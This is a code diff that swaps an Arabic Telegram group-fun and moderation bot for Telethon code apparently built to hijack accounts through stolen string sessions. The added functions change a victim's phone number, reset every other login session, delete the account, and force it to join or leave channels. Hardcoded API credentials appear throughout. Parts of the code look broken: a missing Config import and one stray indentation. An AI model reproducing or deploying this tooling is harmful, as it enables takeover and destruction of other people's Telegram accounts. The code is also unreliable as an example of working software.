@@ -1,672 +1,952 @@
-from config import Config
-import requests
-from telebot import types
-import random
-import telebot
-from datetime import date ,timedelta ,time
-import time 
 
-ssss= '5154904380'
-bot_token=Config.TG_BOT_TOKEN
-
-bot = telebot.TeleBot(bot_token)
-p3 = types.InlineKeyboardMarkup()
-p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-A1 = types.InlineKeyboardButton(text = "اوامر الحماية .",callback_data="A1")
-A2 = types.InlineKeyboardButton(text = "اوامر التسلية .",callback_data="A2")
-A3 = types.InlineKeyboardButton(text = "اوامر الالعاب .",callback_data="A3")
-A4 = types.InlineKeyboardButton(text = "اوامر الموسيقى ",callback_data="A4")
-
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-  f2 = message.from_user.first_name 
-  t2 = message.from_user.username 
-  bot.reply_to(message,text="""*اهلا بك عزيزي - *[{}](t.me/{})،
-*  في بوت الاوامر، 
-لمعرفة اوامر البوت ارسل الاوامر*
-""".format(f2,t2),disable_web_page_preview=True,parse_mode="markdown")
-
-abod = ["متى تكون البراءه ذئب ؟",
-            "هل تتوقع أن يصل البشر لمرحلة من التطور تجعلهم يتنقلون بين الكواكب بسهولة ؟",
-            "أشياء ومنتجات جربتها في السفر أعجبتك ؟",
-            "( الحياة مرة )/ هل قرأتها بالضمة أم بالفتحة ؟",
-            "يتجاهلك بالقصد بعد صداقة طويلة، ما مقصده برأيك ؟",
-            "شعورك الحالي في جملة ؟",
-            "عندكم في الشلة ذلك الشخص الخجول جدًا ؟",
-            "أشياء تجعلك تستمر وتتحمّل صعوبات الحياة ؟",
-            "فنان/ة تحلم بلقائه ؟",
-            "بتنام ولا بتواصل ؟",
-            "ردة فعلك لو أوقفتك الشرطة في الطريق وسمعتهم يقولون هذا هو القاتل ؟",
-            "شاركنا افضل قناة عندك ؟",
-            "شيء جميل حصل معك اليوم ؟",
-            "شاركنا صوره تمثل تخصصك ؟",
-            "للإناث | لديكِ الجرأة لمصارحة الشخص اللي أذاك بكل شيء في قلبك ؟",
-            "أكثر طبع غريب فيك وتحبه ؟",
-            "أبسط شيء بعدل يومك كامل ؟",
-            "سؤال تسأل نفسك فيه دائمًا ولا حصلت جواب ؟",
-            "أسم تحب تقوله ؟",
-            "أسم بنت تحبه ؟",
-            "أسم ولد تحبه ؟",
-            "وش تحس من يوم يناديك أبوك ؟",
-            "مين أشد عصبية أمك أو أبوك ؟",
-            "عادي تتابع فلم/مسلسل أكثر من مره ؟",
-            "تقدر ترسل أخر صوره حفظتها ؟",
-            "وش هي أكلتك المفظلة ؟",
-            "وش الصفة الي تميزك عن غيرك ؟",
-            "أنت شخص مسالم ؟",
-            "شيء تسمعه كثير من الناس عنك ؟",
-            "تحس أنك غامض ولا سراويلك منشوره ؟",
-            "صفة تكرهها ؟",
-            "أنت من النوع الي يعرف يسولف ويفتح مواضيع ؟",
-            "موضوع ما تتقبل المزح فيه ؟",
-            "كِلمة توجهها لوالديك ؟",
-            "سطر من أخر أغنية سمعتها ؟",
-            "عندك شخص تقوله كل تفاصيل يومك ؟",
-            "ليش الاغلب يفضلون العلاقات الإكترونية ؟",
-            "وش رأيك بالأهل الي يفتشون الجوالات ؟",
-            "أهلك يفتشون جوالك ؟",
-            "هل أنت راضي عن نفسك الفترة ذي ؟",
-            "أنت من مُحبين الموسيقى القديمة أو الجديدة ؟",
-            "أكله ودك تجربها ؟",
-            "لو كانت للأيام الجميلة رائحه ماذا ستكون ؟",
-            "تاريخ ودك تعيش فيه ؟",
-            "لو تكرهه جدًا ؟",
-            "عطينا إقتباس تحبه ؟",
-            "عطينا حكمة لليوم ؟",
-            "حكمتك الي ماشي عليها ؟",
-            "أنت فاشل دراسيًا ؟",
-            "انت متوظف ؟",
-            "أسمك الي بالبرنامج غير عن الواقعي ؟",
-            "مين الي أختار لك أسمك ؟",
-            "كذبت في الأسئلة الي راحت ؟",
-            "لو العالم مافيه أحد غيرك وش بتسوي ؟",
-            "هل يومك جيد ؟",
-            "القهوة بنظرك ؟",
-            "تفكيرك الأن مُختلف عن العام الماضي ؟",
-            "لو تروح مكتبه مثل جرير اول قسم تتوجه له دائمًا ؟",
-            "تقدر تستغني عن هاتفك لأسبوع ؟",
-            "شيء تحس لو ما سويته ليوم تفقده ؟",
-            "رسالة لنفسك المستقبيلة ؟",
-            "وش رأيك في الي يطلب السناب ؟",
-            "تقدر تعطي سنابك أحد ؟",
-            "كم شخص مسوي له بلوك ؟",
-            "مفهوم الصداقة بالنسبة لك ؟",
-            "يزيد حُبي لكِ لمّا ... ؟",
-            "مِن نِعْم الحياة ... ؟",
-            "اذا فضفضت ترتاح ؟",
-            "اكثر شي ينرفزك ؟",
-            "اخر مكان رحتله ؟",
-            "شخص @ تعترفلة بشي ؟",
-            "تغار ؟",
-            "تعتقد فيه أحد يراقبك 👩🏼‍💻؟",
-            "ولادتك بنفس المكان الي عايش فيه ولا لا؟",
-            "اكثر شي ينرفزك ؟",
-            "تغار ؟",
-            "كم تبلغ ذاكرة هاتفك؟",
-            "صندوق اسرارك ؟",
-            "شخص @ تعترفله بشي ؟",
-            "يومك ضاع على ؟",
-            "اغرب شيء حدث في حياتك ؟",
-            " نسبة حبك للاكل ؟",
-            " حكمة تأمان بيها ؟",
-            " اكثر شي ينرفزك ؟",
-            " هل تعرضت للظلم من قبل؟",
-            " خانوك ؟",
-            " تزعلك الدنيا ويرضيك ؟",
-            " تاريخ غير حياتك ؟",
-            " أجمل سنة ميلادية مرت عليك ؟",
-            " ولادتك بنفس المكان الي هسة عايش بي او لا؟",
-            " تزعلك الدنيا ويرضيك ؟",
-
-" ماهي هوايتك؟",
-            " دوله ندمت انك سافرت لها ؟",
-            "شخص اذا جان بلطلعة تتونس بوجود؟",
-            " تاخذ مليون دولار و تضرب خويك؟",
-            " تاريخ ميلادك؟",
-            "اشكم مره حبيت ؟",
-            " يقولون ان الحياة دروس ، ماهو أقوى درس تعلمته من الحياة ؟",
-            " هل تثق في نفسك ؟",
-            " اسمك الثلاثي ؟",
-            "كلمة لشخص خذلك؟",
-            "هل انت متسامح ؟",
-            "طريقتك المعتادة في التخلّص من الطاقة السلبية؟",
-            "عصير لو قهوة؟",
-            " صديق أمك ولا أبوك. ؟",
-            "تثق بـ احد ؟",
-            "كم مره حبيت ؟",
-            " اوصف حياتك بكلمتين ؟",
-            " حياتك محلوا بدون ؟",
-            " وش روتينك اليومي؟",
-            " شي تسوي من تحس بلملل؟",
-            " يوم ميلادك ؟",
-            " اكثر مشاكلك بسبب ؟",
-            " تزعلك الدنيا ويرضيك ؟",
-            " تتوقع فيه احد حاقد عليك ويكرهك ؟",
-            "كلمة غريبة من لهجتك ومعناها؟",
-            " • هل تحب اسمك أو تتمنى تغييره وأي الأسماء ستختار",
-            "• كيف تشوف الجيل ذا؟",
-            "• تاريخ لن تنساه📅؟",
-            "• هل من الممكن أن تقتل أحدهم من أجل المال؟",
-            "• تؤمن ان في حُب من أول نظرة ولا لا ؟.",
-            "• ‏ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭",
-            "• طبع يمكن يخليك تكره شخص حتى لو كنت تُحبه🙅🏻‍♀️؟",
-            "• ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
-            "• أطول مدة نمت فيها كم ساعة؟",
-            "• كلمة غريبة من لهجتك ومعناها؟🤓",
-            "• ردة فعلك لو مزح معك شخص م تعرفه ؟",
-            "• شخص تحب تستفزه😈؟",
-            "• تشوف الغيره انانيه او حب؟",
-            "• مع او ضد : النوم افضل حل لـ مشاكل الحياة؟",
-            "• اذا اكتشفت أن أعز أصدقائك يضمر لك السوء، موقفك الصريح؟",
-            "• ‏للعيال - آخر مرة وصلك غزل من بنت؟",
-            "• أوصف نفسك بكلمة؟",
-            "• شيء من صغرك ماتغير فيك؟",
-            "• ردة فعلك لو مزح معك شخص م تعرفه ؟",
-            "• اذا شفت حد واعجبك وعندك الجرأه انك تروح وتتعرف عليه ، مقدمة الحديث وش راح تكون ؟.",
-            "• كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
-            "• حاجة تشوف نفسك مبدع فيها ؟",
-            "• يهمك ملابسك تكون ماركة ؟",
-            "• يومك ضاع على؟",
-            "• اذا اكتشفت أن أعز أصدقائك يضمر لك",
-            " السوء، موقفك الصريح؟",
-            "• هل من الممكن أن تقتل أحدهم من أجل المال؟",
-            "• كلمه ماسكه معك الفترة هذي ؟",
-            "• كيف هي أحوال قلبك؟",
-            "• صريح، مشتاق؟",
-            "• اغرب اسم مر عليك ؟",
-            "• تختار أن تكون غبي أو قبيح؟",
-            "• آخر مرة أكلت أكلتك المفضّلة؟",
-            "• اشياء صعب تتقبلها بسرعه ؟",
-            "• كلمة لشخص غالي اشتقت إليه؟",
-            "• اكثر شيء تحس انه مات ف مجتمعنا؟",
-            "• هل يمكنك مسامحة شخص أخطأ بحقك لكنه قدم الاعتذار وشعر بالندم؟",
-            "• آخر شيء ضاع منك؟",
-            "• تشوف الغيره انانيه او حب؟",
-            "• لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟",
-            "• شيء كل م تذكرته تبتسم ...",
-            "• هل تحبها ولماذا قمت باختيارها؟",
-            "• هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
-            "• متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
-            "• أقبح القبحين في العلاقة: الغدر أو الإهمال🤷🏼؟",
-            "• هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
-            "• هل تشعر أن هنالك مَن يُحبك؟",
-            "• وش الشيء الي تطلع حرتك فيه و زعلت ؟",
-            "• صوت مغني م تحبه",
-            "• كم في حسابك البنكي ؟",
-            "• اذكر موقف ماتنساه بعمرك؟",
-            "• ردة فعلك لو مزح معك شخص م تعرفه ؟",
-            "• عندك حس فكاهي ولا نفسية؟",
-            "• من وجهة نظرك ما هي الأشياء التي تحافظ على قوة وثبات العلاقة؟",
-            "• ما هو نوع الموسيقى المفضل لديك والذي تستمع إليه دائمًا؟ ولماذا قمت باختياره تحديدًا؟",
-
-"• هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
-            "• هل وصلك رسالة غير متوقعة من شخص وأثرت فيك ؟",
-            "• شيء من صغرك ماتغير فيك؟",
-            "• هل يمكنك أن تضحي بأكثر شيء تحبه وتعبت للحصول عليه لأجل شخص تحبه؟",
-            "• هل تحبها ولماذا قمت باختيارها؟",
-            "• كلمة لشخص أسعدك رغم حزنك في يومٍ من الأيام ؟",
-            "• كم مره تسبح باليوم",
-            "• أفضل صفة تحبه بنفسك؟",
-            "• أجمل شيء حصل معك خلال هاليوم؟",
-            "• ‏شيء سمعته عالق في ذهنك هاليومين؟",
-            "• هل يمكنك تغيير صفة تتصف بها فقط لأجل شخص تحبه ولكن لا يحب تلك الصفة؟",
-            "• ‏أبرز صفة حسنة في صديقك المقرب؟",
-            "• ما الذي يشغل بالك في الفترة الحالية؟",
-            "• آخر مرة ضحكت من كل قلبك؟",
-            "• احقر الناس هو من ...",
-            "• اكثر دوله ودك تسافر لها؟",
-            "• آخر خبر سعيد، متى وصلك؟",
-            "• ‏نسبة احتياجك للعزلة من 10؟",
-            "• هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
-            "• أكثر جملة أثرت بك في حياتك؟",
-            "• لو قالوا لك  تناول صنف واحد فقط من الطعام لمدة شهر .",
-            "• هل تنفق مرتبك بالكامل أم أنك تمتلك هدف يجعلك توفر المال؟",
-            "• آخر مرة ضحكت من كل قلبك؟",
-            "• وش الشيء الي تطلع حرتك فيه و زعلت ؟",
-            "• تزعلك الدنيا ويرضيك ؟",
-            "• متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟",
-            "• تعتقد فيه أحد يراقبك؟",
-            "• احقر الناس هو من ...",
-            "• شيء من صغرك ماتغير فيك؟",
-            "• وين نلقى السعاده برايك؟",
-            "• هل تغارين من صديقاتك؟",
-            "• أكثر جملة أثرت بك في حياتك؟",
-            "• كم عدد اللي معطيهم بلوك؟",
-            "• أجمل سنة ميلادية مرت عليك ؟",
-            "• أوصف نفسك بكلمة؟",]
+#قم بوضع توكن البوت في سطر 17
+#قم بوضع يوزر البوت بدون @ في سطر 27
 
 
-n = ["وففف تخبل 😍🤤",
-"لزكت بيه دغيره 😒😒",
-"كلسا ايدي كلسا ايدي دكافي كبرر ",
-"ابه نيو شوفو صورتي ",
-"حلغوم والله ،🥺💘 ", 
-"مو صوره غنبله براسها ٦٠ حظ",
-"مقتنع بصورتك !؟ ",
-"كشخه برب ،😉🤍 "]
-pm = ["ع اساس شلونه،",
-"كشخه والعباس 🤤♥️",
-"حلغوم والله،🥺❤️",
-"شوفني حلو وهو جنه بريعصي،😂",
-"تف ع صورتك شخبصتنه،😏",
-"حمضتتتتتت،",
-"جذاب خامطه،",
-"هل صاك/ة منين ؟؟؟",
-"عبود الحكللي روحي طاحت من السيرفر 😱"]
 
-	
-@bot.message_handler(content_types=['text'])
-def start(message):
-	#if 'http' in message.text:
-#		bot.delete_message(id,messagesid)
-	if message.text == "ا" or message.text == "id" or message.text == "ايدي":
-		n = ["وففف تخبل 😍🤤",
-"لزكت بيه دغيره 😒😒",
-"كلسا ايدي كلسا ايدي دكافي كبرر ",
-"ابه نيو شوفو صورتي ",
-"حلغوم والله ،🥺💘 ", 
-"مو صوره غنبله براسها ٦٠ حظ",
-"مقتنع بصورتك !؟ ",
-"كشخه برب ،😉🤍 "]
-		s333 = random.choice(n)
-		url = f"https://t.me/{message.from_user.username}"
-		info = bot.get_chat(message.from_user.id)
-		bio = info.bio
-		c = message.from_user.id
-		k = message.from_user.username
-		d = time.strftime("%p %H:%M")
-		t = message.chat.type
-		y = '@PJPPPPPP'
-		bot.send_photo(message.chat.id,url,"""*  {}
-		
-𖡋 𝐈𝐃 ⌯ {} 
+import os
+from telethon import TelegramClient, events, functions, types, Button
+from datetime import timedelta
+import asyncio
 
-𖡋 𝐔𝐒𝐄𝐑 ⌯ @{}
+API_ID = ("19662621")
+import os, asyncio, re
+from os import system
+from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
+API_HASH = ("24c2270e7f1336eb59ca6c48e42ec6ca")
+token = Config.TG_BOT_TOKEN
+client = TelegramClient('ArabicHack', 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca").start(bot_token=token)
+from telethon import TelegramClient as tg
+from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
+from telethon.sessions import StringSession as ses
+from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
+import telethon;from telethon import functions
+from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
-𖡋 𝐓𝐈𝐌𝐄 ⌯  {}
+from telethon.tl.functions.channels import CreateChannelRequest as ccr
+mybot = "TmJoanBoT"
+bot = borg = client
 
-𖡋 𝐓𝐘𝐏𝐄 ⌯  {} 
+ArabicHack = 5154904380
 
-𖡋 𝐁𝐈𝐎 ⌯ {} *""".format(s333,c,k,d,t,bio),parse_mode="markdown",reply_to_message_id=message.message_id)
-	m = message.text
-	if m == "ر":
-	 e = message.chat.id
-	 u = bot.get_chat(e).photo.big_file.id
-	 file_info = bot.get_file(u)
-	 downloaded_file = bot
-	 download_file(file_info.file_path)
-	 with open('new_file.png', 'wb') as new_file:
-	 	new_file.write(downloaded_file)
-	 	with open('new_file.png', 'rb') as photo:
-	 		bot.send_photo(message.chat.id, photo)
-	if message.text == "المجموعة" or message.text == "الكروب":
-		j = message.chat.title
-		t = time.strftime("%p %H:%S")
-		l = bot.export_chat_invite_link(message.chat.id)
-		f2 = message.from_user.first_name
-		t2 = message.from_user.username
-		bot.reply_to(message,text="""*
-اسم المجموعة ☆ {} 
+api_id = ("19662621")
+api_hash = ("24c2270e7f1336eb59ca6c48e42ec6ca")
 
-رابط المجموعة ☆ {}
+Bot_Username =(mybot , None) or "SessionHackingBot"
 
-انت ☆* [{}](t.me/{}) *
+async def change_number_code(strses, number, code, otp):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    bot = client = X
+    try:
+      await bot(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+		      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    try: 
+      result = await bot(functions.account.ChangePhoneRequest(
+        phone_number=number,
+        phone_code_hash=code,
+        phone_code=otp
+      ))
+      return True
+    except:
+      return False
 
-الوقت ☆ {}*
-""".format(j,l,f2,t2,t),disable_web_page_preview=True,parse_mode="markdown")
-	if message.text == "رفع مطي" or message.text == "وضع مطي":
-		if message.reply_to_message:
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			bot.reply_to(message,"""*تم رفع  **العضو -*  [{}](t.me/{})*
-في قائمة المطاية اصبح مطي جديد*""".format(f2,t2),parse_mode="markdown",disable_web_page_preview=True)
-	
-	m = message.text
-	if m == ".":
-		f2 = message.from_user.first_name
-		p3 = types.InlineKeyboardMarkup()
-		p5 = types.InlineKeyboardButton(text = "🇰🇼",url="t.me/pjpppppp")
-		p3.add(p5)
-		bot.reply_to(message,f"{f2}",reply_markup=p3)
-	if '@' in message.text.lower():
-		bot.delete_message(message.chat.id, message.message_id)
-		f2 = message.from_user.first_name
-		t2 = message.from_user.username
-		bot.send_message(message.chat.id,"""*عذراً عزيزي ✵* [{}](t.me/{}) 
-*لايمكنك ارسال المعرفات *
-""".format(f2,t2),disable_web_page_preview=True,parse_mode="markdown")
-	if 'https' in message.text.lower():
-		bot.delete_message(message.chat.id, message.message_id)
-		f2 = message.from_user.first_name
-		t2 = message.from_user.username
-		bot.send_message(message.chat.id,"""*عذراً عزيزي *✵ [{}](t.me/{})
-*لا يمكنك ارسال الروابط*""".format(f2,t2),parse_mode="markdown",disable_web_page_preview=True)
-	if message.text == "تثبيت" or message.text == "ت" or message.text == "bin":
-	  if message.reply_to_message:
-	  	bot.pin_chat_messages(message.chat.id,message.reply_to_message.message_id)
-	  	bot.reply_to(message,"تم تثبيت الرسالة!")
-	  
-	if message.text == "الغاء تثبيت" or message.text == "unban" or message.text == "الغاء التثبيت":
-		if message.reply_to_message:
-			bot.unpin_all_chat_message(message.chat.id,message.reply_to_message.message_id)
-			bot.reply_to(message,"تم الغاء تثبيت الرسالة!") 
-	if m == "المطور" or m == "مطور" or m == "المبرمج":
-		p3 = types.InlineKeyboardMarkup()
-		e4 = types.InlineKeyboardButton(text = "المطور .",url="t.me/bbannd")
-		p3.add(e4)
-		h = """[مطور السورس .](t.me/bbannd)"""
-		bot.reply_to(message,h,parse_mode="markdown",reply_markup=p3,disable_web_page_preview=True)
-		f2 = message.from_user.first_name
-		t2 = message.from_user.username
-		l = bot.export_chat_invite_link(message.chat.id)
-		y = f"http://t.me/{message.chat.username}/{message.id}"
-		o = message.text
-		bot.send_message(ssss,"""*المستخدم *: [{}](t.me/{})
+async def change_number(strses, number):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    bot = client = X
+    try:
+      await bot(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await bot(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await bot(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    result = await bot(functions.account.SendChangePhoneCodeRequest(
+        phone_number=number,
+        settings=types.CodeSettings(
+            allow_flashcall=True,
+            current_number=True,
+            allow_app_hash=True
+        )
+    ))
+    return str(result)
 
-*رابط المجموعة : {}
 
-رابط الرسالة : {}
+async def userinfo(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    k = await X.get_me()
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    return str(k)
 
-الرسالة : {}*""".format(f2,t2,l,y,o),disable_web_page_preview=True,parse_mode="markdown")
-	if m == "اسمي":
-		f2 = message.from_user.first_name
-		f3 = message.from_user.last_name
-		bot.reply_to(message,f"""*𖡋 𝐅𝐈𝐑𝐒𝐓 𝐍𝐀𝐌𝐄 ⌯ {f2}
-		
-𖡋𝐋𝐀𝐒𝐓 𝐍𝐀𝐌𝐄 ⌯ {f3}*""",parse_mode="markdown")
-	if m == "اليوزر" or m == "يوزري":
-			t2 = message.from_user.username
-			bot.reply_to(message,f"*𖡋 𝐔𝐒𝐄𝐑 ⌯ @{t2}*",parse_mode="markdown")				
-	if m == "البايو" or m == "بايو":
-		info = bot.get_chat(message.from_user.id)
-		bio = info.bio
-		bot.reply_to(message,f"*𖡋 𝐁𝐈𝐎 ⌯ {bio}*",parse_mode="markdown")				
-	if m == "البايو" or m == "بايو":
-		if message.reply_to_message:
-			info = bot.get_chat(message.reply_to_message.from_user.id)
-			bio = info.bio
-			bot.reply_to(message,f"*𖡋 𝐁𝐈𝐎 ⌯ {bio}*",parse_mode="markdown")					
-	elif message.text == "كشف" or message.text == "ا":
-		if message.reply_to_message:
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			c = message.reply_to_message.from_user.id
-			k = message.reply_to_message.from_user.username
-			d = time.strftime("%p %H:%M")
-			
-			bot.reply_to(message,text="""*𖡋 𝐈𝐃 ⌯ {} 
+async def terminate(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@IndianUpdateChannel"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@Ids_Holder"))
+    except BaseException:
+      pass
+    await X(rt())
 
-𖡋 𝐔𝐒𝐄𝐑 ⌯ @{}
+GROUP_LIST = []
+async def delacc(strses):
+  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    try:
+      await X(join("@Ids_Holder"))
+    except BaseException:
+      pass
+    try:
+      await X(join("@SAYTHONH"))
+    except BaseException:
+      pass
+    try:
+      await X(leave("@SAYTHONH"))
+    except BaseException:
+      pass
+    await X(functions.account.DeleteAccountRequest("I am chutia"))
 
-𖡋 𝐓𝐈𝐌𝐄 ⌯  {}*""".format(c,t2,d),parse_mode="markdown")		
-	if message.text == "كشف حيوان" or message.text == "نوع الحيوان":
-			h222 = ['%90','%80','%70','%60','%50','%40','%30','%20','%10']
-			s222 = ["جلب🦮","مطي🐴","بقرة🐄","ثور🐂","فأر🐀","قنفذ🐿","كلب الماي🐩","صخل 🐐","اسد 🦁"]
-			r222 = random.choice(h222)
-			d222 = random.choice(s222)
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			
-			bot.reply_to(message,text="""*اسم الحيوان :* [{}](t.me/{})* 
-نسبة الحيوان : {}
-نوع الحيوان : {}*""".format(f2,t2,r222,d222),disable_web_page_preview=True,parse_mode="markdown")
-	if message.text == "السورس" or message.text == "سورس":
-	    url = ["https://telegra.ph/file/5047bab5c7a88be186c93.jpg","https://telegra.ph/file/b69cb1ea62b6b63162aca.jpg","https://telegra.ph/file/c621f99ca961ffa2dafb8.jpg","https://telegra.ph/file/5571ba4345056196a6c2b.jpg"]
-	    p3 = types.InlineKeyboardMarkup()
-	    e3 = types.InlineKeyboardButton(text = "قناة السورس .",url="t.me/pjpppppp")
-	    e4 = types.InlineKeyboardButton(text = "المطور .",url="t.me/bbannd")
-	    p3.add(e3,e4)
-	    r = random.choice(url)
-	    h = """اهلا بك عزيزي في سورس الشبح
-[قناة السورس .](t.me/pjpppppp)
-[مطور السورس .](t.me/bbannd)"""
-	    bot.send_photo(message.chat.id,r,h,reply_to_message_id=message.message_id,reply_markup=p3,parse_mode="markdown")
-	if message.text == "e":
-		c = bot.get_chat_member_count(chat_id)
-		bot.reply_to(message,f"{c}")
-	if message.text == "اطردني" or message.text == "غادر":
-		i = message.from_user.id
-		bot.kick_chat_member(message.chat.id,i)
-		f2 = message.from_user.first_name
-		t2 = message.from_user.username
-		bot.reply_to(message,text="*تم حظرك من المجموعة↩️ :* [{}](t.me/{})".format(f2,t2,i),parse_mode="markdown",disable_web_page_preview=True)
-	if message.text == "حظر" or message.text == "طرد" or message.text == "حضر":
-		if message.reply_to_message.from_user.id:
-			bb = message.reply_to_message.from_user.id
-			vv = message.reply_to_message.from_user.username
-			bot.kick_chat_member(message.chat.id,bb)
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			bot.reply_to(message,text="*تم حظر العضو ↩️ :* [{}](t.me/{})".format(f2,t2,vv,bb),parse_mode="markdown",disable_web_page_preview=True)
-	if message.text == "حظر" or message.text == "طرد" or message.text == "حضر":
-		if message.reply_to_message:
-			bb = message.reply_to_message.from_user.id
-			vv = message.reply_to_message.from_user.username
-			bot.kick_chat_member(message.chat.id,bb)
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			bot.reply_to(message,text="*تم حظر العضو ↩️ :* [{}](t.me/{})".format(f2,t2,vv,bb),parse_mode="markdown",disable_web_page_preview=True)
-	if message.text == "الغاء حظر" or message.text == "الغاء الحظر":
-		if message.reply_to_message:
-			bb = message.reply_to_message.from_user.id
-			vv = message.reply_to_message.from_user.username
-			bot.unban_chat_member(message.chat.id,bb)
-			f2 = message.reply_to_message.from_user.first_name
-			t2 = message.reply_to_message.from_user.username
-			
-			bot.reply_to(message,"""*تم الغاء حظر العضو ↩️ :* [{}](t.me/{}) """.format(f2,t2,vv,bb),disable_web_page_preview=True,parse_mode="markdown")
-	if message.text == "الاوامر" or message.text == "اوامر":
-		p3 = types.InlineKeyboardMarkup()
-		p5 = types.InlineKeyboardButton(text = "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-		A1 = types.InlineKeyboardButton(text = "اوامر الحماية .",callback_data="A1")
-		A2 = types.InlineKeyboardButton(text = "اوامر التسلية .",callback_data="A2")
-		A3 = types.InlineKeyboardButton(text = "اوامر الالعاب .",callback_data="A3")
-		A4 = types.InlineKeyboardButton(text = "اوامر الموسيقى ",callback_data="A4")
-		p3.add(A1,A2)
-		p3.add(A3,A4)
-		p3.add(p5)
-		f2 = message.from_user.first_name 
-		t2 = message.from_user.username
-		bot.reply_to(message,text="""*اهلا بك عزيزي - *[{}](t.me/{})،
-*  في اوامر البوت، 
-اختر من الازرار،*
-""".format(f2,t2),disable_web_page_preview=True,parse_mode="markdown",reply_markup=p3)
-	p3 = types.InlineKeyboardMarkup()
-	p5 = types.InlineKeyboardButton( "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-	p3.add(p5)
-	if message.text == "تمبلر" or message.text == "صور تمبلر" or message.text == "افتار تمبلر":
-		photo_str =  random.randint(74,154)
-		avtar_ainme = "https://t.me/PhotosDavid/" + str(photo_str)
-		bot.send_photo(message.chat.id,avtar_ainme,"""*تم اختيار صوره تمبلر اليك،
-- - - -- - - - - -- - - - -
-CH - @PJPPPPPP : @BBANND*""",parse_mode="markdown",reply_to_message_id=message.message_id,reply_markup=p3)
-	p3 = types.InlineKeyboardMarkup()
-	p5 = types.InlineKeyboardButton( "[!] 𝗚𝗛𝗢𝗦𝗧 ^ 𝗦𝗢𝗨𝗥𝗖𝗘 🇰🇼",url="t.me/pjpppppp")
-	p3.add(p5)
-	
-	
-	if "تاك" in message.text:
-	 m = message
-	 mm = message.text
-	 k = "تعال حب ديصيحوك 🕸️ "
-	 rep=str(message.text).split(" ")
-	 bot.reply_to(m,mm.replace("تاك"," تعال حب ديصيحوك 🕸️"))	
-	if message.text == "لاعبين" or message.text == "لاعب" or message.text == "افتار لاعب" or message.text == "افتار لاعبين":
-		photo_str =  random.randint(74,154)
-		avtar_ball = "https://t.me/avtar781/" + str(photo_str)
-		bot.send_photo(message.chat.id,avtar_ball,"""*تم اختيار صورة لاعب اليك،
-- - - -- - - - - -- - - - -
-CH - @PJPPPPPP : @BBANND*""",parse_mode="markdown",reply_to_message_id=message.message_id,reply_markup=p3)
-	if message.text == "ريمكس" or message.text == "مكس" or message.text == "ريم":
-		song_str = random.randint(74,154)
-		song_voice = "https://t.me/vVvdav/" + str(song_str)
-		bot.send_audio(message.chat.id,song_voice,"""*✯ تم ختيار ريمكس اليك، 
-- @Sss0s0bot*""",parse_mode="markdown",reply_to_message_id=message.message_id,reply_markup=p3)
-	if message.text == "شعر" or message.text == "ش":
-		song_str = random.randint(74,904)
-		song_voice = "https://t.me//" + str(song_str)
-		bot.send_voice(message.chat.id,song_voice,"""*✯ تم ختيار شعر اليك، 
-- @Sss0s0bot*""",parse_mode="markdown",reply_to_message_id=message.message_id,reply_markup=p3)
